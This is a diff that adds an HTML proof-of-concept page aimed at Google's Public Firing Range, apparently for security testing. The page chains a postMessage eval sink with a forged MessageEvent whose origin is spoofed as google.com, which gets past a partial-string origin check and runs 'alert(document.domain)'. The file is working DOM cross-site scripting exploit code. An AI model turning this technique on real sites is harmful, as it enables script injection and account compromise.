@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <iframe id=iframe></iframe>
+    <script>
+      function postMessageExploit(exploit, url) {
+        var iframe = document.getElementById('iframe');
+        iframe.addEventListener('load', () => { 
+          iframe.contentWindow.postMessage(exploit, '*');
+        });
+        iframe.src = url;
+      }
+      postMessageExploit(`
+        const url = 'https://public-firing-range.appspot.com/dom/toxicdom/postMessage/improperOriginValidationWithPartialStringComparison';
+        const iframe = document.createElement('iframe');
+        document.body.appendChild(iframe);
+        iframe.addEventListener('load', () => {
+          var event = new MessageEvent(
+            'message', 
+            {
+              origin: 'https://www.google.com',
+              data: 'alert(document.domain)'
+            }
+          );
+          iframe.contentWindow.dispatchEvent(event, '*');
+        });
+        iframe.src = url;
+      `,
+      'https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval');
+    </script>
+  </body>
+</html>
